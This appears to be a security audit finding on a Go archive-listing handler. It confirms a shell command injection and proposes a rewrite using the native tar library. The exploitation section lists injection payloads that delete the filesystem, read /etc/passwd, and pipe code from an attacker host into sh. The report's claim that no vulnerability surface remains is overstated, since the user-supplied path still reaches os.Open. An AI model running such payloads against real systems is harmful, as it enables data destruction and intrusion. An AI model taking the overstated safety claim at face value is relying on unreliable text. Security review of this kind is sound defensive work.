## Verdict

The finding is confirmed. OS Command Injection vulnerability exists at line 11 of archive_runner.go where untrusted user input (archiveName from HTTP query parameter) is concatenated directly into a shell command string executed via `sh -c`. This allows arbitrary shell command execution.

## Source

**Entry point:** archive_handler.go line 7: `r.URL.Query().Get("archive")` retrieves user-controlled HTTP query parameter

**Data flow:**
1. Untrusted archiveName flows from HTTP query parameter to archive_handler.go line 13: `runner.ListArchive(r.Context(), archiveName)`
2. Reaches archive_runner.go line 11: parameter archiveName in the ListArchive method
3. Concatenated into command string: `"tar -tf "+archiveName`
4. Passed to `exec.CommandContext(ctx, "sh", "-c", ...)` which executes via shell interpreter

**Taint sink:** `exec.CommandContext(ctx, "sh", "-c", "tar -tf "+archiveName)` at archive_runner.go line 11

**Exploitation:** Attacker can inject shell metacharacters and commands via the archive query parameter:
- `?archive=archive.tar; rm -rf /`
- `?archive=$(curl http://attacker.com/malware | sh)`
- `?archive=archive.tar | cat /etc/passwd`

## Fix

### File: archive_runner.go

```go
package archivelist

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"io"
	"os"
	"strings"
)

type ArchiveRunner struct{}

func (r *ArchiveRunner) ListArchive(ctx context.Context, archiveName string) ([]byte, error) {
	file, err := os.Open(archiveName)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var tr *tar.Reader
	
	// Auto-detect gzip compression based on file extension
	if strings.HasSuffix(archiveName, ".gz") {
		gz, err := gzip.NewReader(file)
		if err != nil {
			return nil, err
		}
		defer gz.Close()
		tr = tar.NewReader(gz)
	} else {
		tr = tar.NewReader(file)
	}
	
	var output bytes.Buffer
	
	for {
		header, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, err
		}
		output.WriteString(header.Name + "\n")
	}
	
	return output.Bytes(), nil
}
```

## Explanation

The vulnerability stems from the primary defence failure: OS command execution should be eliminated entirely when a native library alternative exists. The original code used `sh -c "tar -tf "+archiveName`, explicitly invoking a shell interpreter with concatenated user input.

The remediation follows CWE-78/Go guidance to "Replace with Go standard library equivalents (`archive/tar`)". This completely eliminates the command execution sink by using Go's built-in `archive/tar` package to read tar archives directly.

The fix:
1. **Removes shell invocation:** No `sh -c`, no string concatenation - eliminates the injection vector entirely
2. **Uses native library:** Go's `archive/tar` package handles tar file reading with proper error handling
3. **Handles compression:** Auto-detects and decompresses gzip-compressed tar files (`.tar.gz`) based on file extension, preserving parity with the original `tar` command's auto-detection
4. **Preserves output format:** Iterates through tar headers and outputs filenames line-by-line, matching the original `tar -tf` output format
5. **Returns same type:** Method signature unchanged - still returns `([]byte, error)`
6. **Proper error handling:** File open errors and tar read errors are returned as proper errors rather than mixed with output

## Behaviour changes

**Breaking changes:** None - the method signature remains identical, and the output format (filenames separated by newlines) is preserved.

**Functional changes:**
- **Error handling improvement:** The original code returned combined stdout/stderr via `CombinedOutput()`, mixing tar output with any error messages. The fixed version properly separates errors (returned as error value) from successful output (returned in []byte), providing clearer error handling to the HTTP handler.
- **Compression support:** The fix explicitly handles gzip compression detection, matching the original `tar` command's automatic compression detection for `.tar.gz` files.
- **No vulnerability surface:** Shell injection is completely eliminated - the archiveName parameter is used only as a filename for `os.Open()`, never passed to any command interpreter.

The fixed code eliminates the injection vector by using the parameterization principle from CWE-78 guidance: never construct commands from untrusted input. In this case, the strongest fix is to eliminate command execution entirely, which is now possible with Go's standard library.
